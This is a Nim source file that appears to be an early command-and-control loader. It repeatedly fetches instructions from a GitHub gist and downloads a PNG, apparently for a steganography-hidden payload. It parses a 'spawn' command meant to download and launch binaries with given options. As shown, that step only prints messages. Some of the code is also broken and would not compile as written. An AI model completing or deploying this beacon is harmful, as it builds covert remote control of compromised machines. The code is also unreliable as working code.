import std/httpclient
import std/parseopt
import std/strformat
import std/strutils
import std/uri
import std/os
import std/asyncdispatch

proc parse_instruction(command: string, location: string, cmd_line: string): bool =
    case command:
    of "spawn":
        echo("Spawning binary")
        echo(&"downloading from this location {location}")
        echo(&"Spawning with these command line options {cmd_line}")
        result = true
    else:
        echo("unknown command")
        result = false
    return result    

proc get_instruction(location: string): Future[string] =
    var aResult = newFuture[string]("get_instruction")
    var client = newHttpClient()
    try:
        aResult.complete(getContent(client, location))
    except:
        aResult.fail(newException(OSError, "Error occured"))
    client.close()
    return aResult

proc get_image(location: string): Future[seq[byte]] =
    var stegResult = newFuture[seq[byte]]
    var client = newHttpClient()
    try:
        downloadFile(client, location, "photo.png")
        var stegfile = open("photo.png", FileMode.fmReadWriteExisting, -1)
        var dest: array[stegfile.getFileSize(), uint8]
        stegfile.readBytes(dest, 0, stegfile.getFileSize)
        stegResult.complete()
    except:
        stegResult.fail(newException(OSError, "Failed to get picture"))
    client.close()
    return stegResult

proc handle_loop(location: string, stego_location: string, sleep_amount: int) {.async.} =
    var sleep_time = sleep_amount * 1000
    var last_instruction = ""
    while true:
        var res = await get_instruction(location)
        var steg_res = await get_image(stego_location)
        if last_instruction != res:
            last_instruction = res
            var command = res.split(" ")
            if command.len < 2 or not parse_instruction(command[0], command[1], join(command[2..<command.len] , " ")):
                break
        sleep(sleep_time)

when isMainModule:
    var gist_location: string
    var sleep_time = 5
    var default_gist = "https://gist.githubusercontent.com/bartimus-primed/4042ba41ec3a4b30633f0395874363f3/raw"
    var default_stego = "https://raw.githubusercontent.com/bartimus-primed/gist_loader/master/test.png"
    var args = initOptParser("")
    while true:
        args.next()
        case args.kind
        of cmdEnd: break
        of cmdShortOption, cmdLongOption:
            case args.key
            of "gist":
                if args.val != "":
                    var endpoint = "https://gist.githubusercontent.com/"
                    endpoint.add(args.val)
                    endpoint.add("/raw")
                    gist_location = endpoint
            of "sleep":
                if args.val != "":
                    sleep_time = args.val.parseInt()
        of cmdArgument:
            echo(&"ERROR: --gist=USERNAME/GIST_ID needs to be a Valid HTTP/HTTPS gist endpoint")
    if gist_location == "":
        gist_location = default_gist
    waitFor handle_loop(gist_location, default_stego, sleep_time)